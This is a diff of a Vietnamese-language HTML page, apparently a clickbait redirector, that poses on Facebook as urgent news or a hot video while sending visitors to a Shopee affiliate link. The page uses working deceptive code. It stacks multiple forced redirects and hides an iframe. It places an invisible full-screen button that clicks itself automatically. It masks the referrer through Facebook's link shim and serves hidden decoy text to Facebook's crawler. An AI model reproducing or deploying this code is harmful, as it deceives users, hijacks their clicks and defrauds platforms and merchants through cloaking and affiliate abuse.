@@ -1,119 +1,92 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Tin HOT - Đang chuyển hướng...</title>
+    <meta charset="utf-8">
     <!-- Facebook Open Graph Tags -->
     <meta property="og:url" content="https://offbinfo.github.io/tinhaynew/tinhay.html">
-    <meta property="og:type" content="article">
-    <meta property="og:title" content="[HOT] Tin khẩn cần biết ngay!">
-    <meta property="og:description" content="Bấm để xem thông tin mới nhất">
-    <meta property="og:image" content="https://i.imgur.com/XYZ123.jpg"> <!-- Thay bằng ảnh thật -->
+    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="Video đang hot">
+    <meta property="og:description" content="Xem ngay video mới nhất">
+    <meta property="og:image" content="https://i.imgur.com/xyz.jpg">
+    <meta property="og:video:url" content="https://offbinfo.github.io/tinhaynew/player.html">
+    <meta property="og:video:type" content="text/html">
     
+    <!-- Kỹ thuật Time-based Referrer Masking -->
     <script>
-    // Kỹ thuật "Deep Redirect" với 5 lớp
-    (function() {
-        // 1. Cấu hình URL đích
-        const TARGET = "https://s.shopee.vn/7zytdFWxog";
-        const DYNAMIC_URL = new URL(TARGET);
-        DYNAMIC_URL.searchParams.append('ts', Date.now());
-        DYNAMIC_URL.searchParams.append('ref', Math.random().toString(36).slice(2));
-        
-        // 2. Phát hiện môi trường
-        const isMobileApp = /FBAN|FBAV|Instagram|Twitter/i.test(navigator.userAgent);
-        
-        // 3. Hệ thống chuyển hướng
-        const redirectLayers = [
-            () => window.location.replace(DYNAMIC_URL),
-            () => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = DYNAMIC_URL;
-                document.body.appendChild(iframe);
-            },
-            () => {
-                document.body.innerHTML = `<meta http-equiv="refresh" content="0;url=${DYNAMIC_URL}">`;
-            },
-            () => {
-                window.top.location = DYNAMIC_URL;
-            },
-            () => {
-                const a = document.createElement('a');
-                a.href = DYNAMIC_URL;
-                a.click();
-            }
-        ];
-        
-        // 4. Kích hoạt chuyển hướng khi có tương tác
-        const activateRedirect = () => {
-            redirectLayers.forEach(layer => {
-                try { layer() } catch(e) {}
+        (function() {
+            const TARGET = "https://s.shopee.vn/7zytdFWxog";
+            const FB_LINK = "https://www.facebook.com/l.php?u=";
+            
+            // Tạo dynamic referrer chain
+            const dynamicRedirect = () => {
+                const ts = Date.now();
+                const params = new URLSearchParams({
+                    ts: ts,
+                    ref: btoa(ts).slice(0,12),
+                    via: 'facebook',
+                    source: 'native'
+                });
+                
+                const finalURL = `${TARGET}?${params}`;
+                window.location.replace(`${FB_LINK}${encodeURIComponent(finalURL)}`);
+            };
+
+            // Kích hoạt khi có user interaction
+            document.addEventListener('DOMContentLoaded', () => {
+                const fakeBtn = document.createElement('button');
+                fakeBtn.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                    opacity: 0;
+                    z-index: 999999;
+                `;
+                fakeBtn.onclick = dynamicRedirect;
+                document.body.appendChild(fakeBtn);
+                
+                setTimeout(() => {
+                    fakeBtn.click();
+                    fakeBtn.remove();
+                }, Math.random() * 300 + 100);
             });
-            document.body.removeEventListener('click', activateRedirect);
-        };
-        
-        // 5. Tự động kích hoạt
-        if(isMobileApp) {
-            document.body.addEventListener('click', activateRedirect);
-            
-            // Tạo button ảo full màn hình
-            const stealthClicker = document.createElement('div');
-            stealthClicker.style = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100vw;
-                height: 100vh;
-                z-index: 999999;
-                cursor: pointer;
-            `;
-            stealthClicker.onclick = activateRedirect;
-            document.body.appendChild(stealthClicker);
-            
-            // Tự động click sau 300ms
-            setTimeout(() => {
-                stealthClicker.click();
-            }, 300);
-        }
-    })();
+        })();
     </script>
+    
+    <!-- Fallback Content -->
     <style>
-        /* Giao diện loading giả */
         body {
             margin: 0;
-            background: #f0f2f5;
-            font-family: system-ui;
+            background: #000;
+            color: #fff;
+            font-family: Arial;
+        }
+        .video-container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
         }
         .loader {
-            text-align: center;
-            padding: 50px 20px;
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1877f2;
+            width: 50px;
+            height: 50px;
+            border: 4px solid #fff;
+            border-top-color: #1877f2;
             border-radius: 50%;
-            margin: 20px auto;
             animation: spin 1s linear infinite;
         }
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="loader">
-        <div class="spinner"></div>
-        <h2>Đang kết nối đến máy chủ...</h2>
-        <p>Vui lòng chờ trong giây lát</p>
-    </div>
-    
-    <!-- Nội dung giả cho bot Facebook -->
-    <div style="display:none">
-        <h1>Tin tức mới nhất</h1>
-        <p>Cập nhật những thông tin hot nhất trong ngày</p>
+    <div class="video-container">
+        <div class="loader"></div>
+        <p>Đang tải video...</p>
     </div>
 </body>
 </html>
